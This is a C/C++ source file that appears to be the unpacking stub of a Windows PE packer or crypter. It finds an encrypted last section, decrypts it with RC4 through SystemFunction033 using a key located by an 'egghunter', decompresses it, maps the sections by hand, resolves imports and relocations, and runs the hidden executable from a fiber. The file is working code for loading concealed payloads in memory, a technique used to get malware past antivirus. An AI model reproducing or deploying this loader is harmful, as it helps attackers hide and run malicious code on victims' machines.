#pragma once


#include "decompressor.h"
#ifdef _DEBUG
#include <iostream>
#endif



DWORD dwThreadId1;
DWORD dwThreadId2;
HANDLE hThread1;
HANDLE hThread2;




void AdjustProtections(char* ImageBase) {
    DWORD oldProtect;
    IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*)ImageBase;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*)(((char*)p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);

    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        char* dest = ImageBase + sections[i].VirtualAddress;
        SIZE_T size = sections[i].Misc.VirtualSize;
        DWORD64 s_perm = sections[i].Characteristics;
        DWORD64 v_perm = 0; //flags are not the same between virtal protect and the section header
        if (s_perm & IMAGE_SCN_MEM_EXECUTE) {
            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        }
        else {
            v_perm = (s_perm & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        }
#ifdef _DEBUG
        printf("[*] Setting permission of section %s to %x. ", sections[i].Name, v_perm);
#endif
        NTSTATUS status = NtProtectVirtualMemory((HANDLE)-1, &dest, (PULONG) & size, v_perm, &oldProtect);
        if(!status){
#ifdef _DEBUG
            printf("Success.\n");
#endif
        }
        else {
#ifdef _DEBUG
            printf("Something went wrong: %x.\n", status);
#endif
            exit(0);
        }

    }
}






char* DecryptAndDecompress(char* Data, DWORD DataSize) {
  
    key.Length = *(int*)(egghunter());
    key.Buffer = (PUCHAR)(egghunter() + sizeof(int));
  
#ifdef _DEBUG
    printf("[+] Data found. Starting decryption with key: %x.\r\n", key.Buffer[0]);
#endif
    char* buffer = (char*)malloc(DataSize);

    mymemcpy(buffer, Data, DataSize - key.Length - sizeof(int));


    _data.Buffer = (PUCHAR)buffer;
    _data.Length = DataSize;

    SystemFunction033(&_data, &key);
#ifdef _DEBUG
    printf("[+] Data decrypted\r\n");
#endif


    char* DecompressedData = (char*)DecompressData((PBYTE)buffer, DataSize);
    
#ifdef _DEBUG
    printf("[+] Data unpacked\r\n");
#endif
    free(buffer);
    return DecompressedData;
}


int unpack() {

    DWORD oldProtect;
    SIZE_T bytesWritten;
    char* unpack_VA = (char*)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*)unpack_VA;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*)(((char*)p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);
    char* PackedData = unpack_VA + sections[p_NT_HDR->FileHeader.NumberOfSections - 1].VirtualAddress;
    SIZE_T PackedDataSize = sections[p_NT_HDR->FileHeader.NumberOfSections - 1].SizeOfRawData;
    char* ImageBase = PackedData;
    NTSTATUS status = NtProtectVirtualMemory((HANDLE)-1, &PackedData, (PULONG)&PackedDataSize, PAGE_READWRITE, &oldProtect);
#ifdef _DEBUG
    printf("[*] Decrypting and decompressing data.\r\n");
    printf("[*] NtProtect status: %x\r\n", status);
#endif

    
    PackedData = DecryptAndDecompress(PackedData, PackedDataSize);

    
    p_DOS_HDR = (IMAGE_DOS_HEADER*)PackedData;
    p_NT_HDR = (IMAGE_NT_HEADERS*)(((char*)p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);
    DWORD ImageSize = p_NT_HDR->OptionalHeader.SizeOfImage;


    //char* ImageBase = (char*)VirtualAlloc((char*)sections[p_NT_HDR->FileHeader.NumberOfSections - 2].VirtualAddress, ImageSize, 0x3000, 0x04);
    mymemcpy(ImageBase, PackedData, p_NT_HDR->OptionalHeader.SizeOfHeaders);
  
    if (ImageBase == NULL) {
#ifdef _DEBUG
        printf("[-] Error finding reserved memory. Exiting.\r\n");
#endif
        return NULL;
    }
    
    // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
    sections = (IMAGE_SECTION_HEADER*)(p_NT_HDR + 1);

    // For each sections
    for (int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        // calculate the VA we need to copy the content, from the RVA 
        // section[i].VirtualAddress is a RVA, mind it
        char* dest = ImageBase + sections[i].VirtualAddress;

        // check if there is Raw data to copy
        if (sections[i].SizeOfRawData > 0) {
#ifdef _DEBUG
            printf("[*] Copying section %s\n", sections[i].Name);
#endif
            mymemcpy(dest, PackedData + sections[i].PointerToRawData, sections[i].SizeOfRawData);

        }
        else {
            mymemset(dest, 0, sections[i].Misc.VirtualSize);

        }

    }
    
    
    
    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;


    // load the address of the import descriptors array
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);


    // this array is null terminated
    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {
        // Get the name of the dll, and import it
        char* module_name = ImageBase + import_descriptors[i].Name;


        wchar_t* vOut = new wchar_t[strlen(module_name) + 2];
        mbstowcs_s(NULL, vOut, strlen(module_name) + 2, module_name, strlen(module_name));
        //_wcslwr_s(vOut, strlen(module_name) + 2); // convert to lowercase
    

        
        HMODULE import_module = 0;
        HMODULE temp = GetModuleHandleW(vOut); // _ version crashes on strcmp
        
        if (temp == 0) {
            import_module = _LoadLibrary(vOut);
            if (import_module == NULL) {
                return NULL;
            }

        }
        else {
            import_module = temp;

#ifdef _DEBUG
            printf("[*] Module %s already loaded. Skipping. \n", module_name);
#endif

        }
        
        // the lookup table points to function names or ordinals => it is the IDT
        IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].OriginalFirstThunk);

        // the address table is a copy of the lookup table at first
        // but we put the addresses of the loaded function inside => that's the IAT
        IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)(ImageBase + import_descriptors[i].FirstThunk);

        // null terminated array, again

        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void* function_handle = NULL;

            // Check the lookup table for the adresse of the function name to import
            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
            IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME*)(ImageBase + lookup_addr);

            if ((lookup_addr ^ lookup_table[i].u1.Ordinal) == 0) { //if first bit is not 1
                // import by name : get the IMAGE_IMPORT_BY_NAME struct
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME*)(ImageBase + lookup_addr);
                // this struct points to the ASCII function name
                char* funct_name = (char*)&(image_import->Name);
                // get that function address from it's module and name
                function_handle = (void*)GetProcAddress(import_module, funct_name);

            }
            else {
                // import by ordinal, directly
                function_handle = (void*)GetProcAddress(import_module, (LPCSTR)MAKELONG((int)lookup_addr, 0));

                //printf("Error: %i. \r\n", GetLastError());
            }

            if (function_handle == NULL) {
                //printf("Error: %i. \r\n", GetLastError());
                return NULL;
            }

            // change the IAT, and put the function address inside.

            address_table[i].u1.Function = (DWORD64)function_handle;

        }
    }



    //this is how much we shifted the ImageBase
    DWORD64 delta_VA_reloc = ((DWORD64)ImageBase) - p_NT_HDR->OptionalHeader.ImageBase;

    // if there is a relocation table, and we actually shitfted the ImageBase
    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {

        //calculate the relocation table address
        PIMAGE_BASE_RELOCATION p_reloc = (PIMAGE_BASE_RELOCATION)(ImageBase + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        //once again, a null terminated array
        while (p_reloc->VirtualAddress != 0) {

            // how any relocation in this block
            // ie the total size, minus the size of the "header", divided by 2 (those are words, so 2 bytes for each)
            DWORD64 size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;

            // the first relocation element in the block, right after the header (using pointer arithmetic again)
            WORD* reloc = (WORD*)(p_reloc + 1);
            for (int i = 0; i < size; ++i) {
                //type is the first 4 bits of the relocation word
                int type = reloc[i] >> 12;

                // offset is the last 12 bits
                int offset = reloc[i] & 0x0fff;

                //this is the address we are going to change
                DWORD64* change_addr = (DWORD64*)(ImageBase + p_reloc->VirtualAddress + offset);

                // there is only one type used that needs to make a change

                switch (type) {
                case IMAGE_REL_BASED_HIGHLOW:
                    *change_addr += delta_VA_reloc;
                    break;
                case IMAGE_REL_BASED_DIR64:
                    *change_addr += delta_VA_reloc;
                    break;
                default:
                    break;
                }

            }
            p_reloc = (IMAGE_BASE_RELOCATION*)(((DWORD64)p_reloc) + p_reloc->SizeOfBlock);
        }
    }


    
    void (*packed_entry_point)(void) = (void(*)())(void*)(ImageBase + p_NT_HDR->OptionalHeader.AddressOfEntryPoint);
#ifdef _DEBUG
    printf("[+] Entrypoint found: %llx.\r\n", (void*)(ImageBase + p_NT_HDR->OptionalHeader.AddressOfEntryPoint));
#endif
    SIZE_T size = p_NT_HDR->OptionalHeader.SizeOfHeaders;
    status = NtProtectVirtualMemory((HANDLE)-1, &ImageBase, (PULONG)&size, PAGE_READONLY, &oldProtect);
    if (status !=0) {
#ifdef _DEBUG
        printf("[-] Failed to reprotect headers\r\n");
#endif
    }
    AdjustProtections(ImageBase);
    free(PackedData);
    
#ifdef _DEBUG
    printf("[+] Cleaned up decompression buffer\n");
#endif
    
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    PVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)packed_entry_point, 0);
#ifdef _DEBUG
    printf("[+] Launching PE.\r\n");
#endif
    
    SwitchToFiber(fiber);
    


    return 0;
}
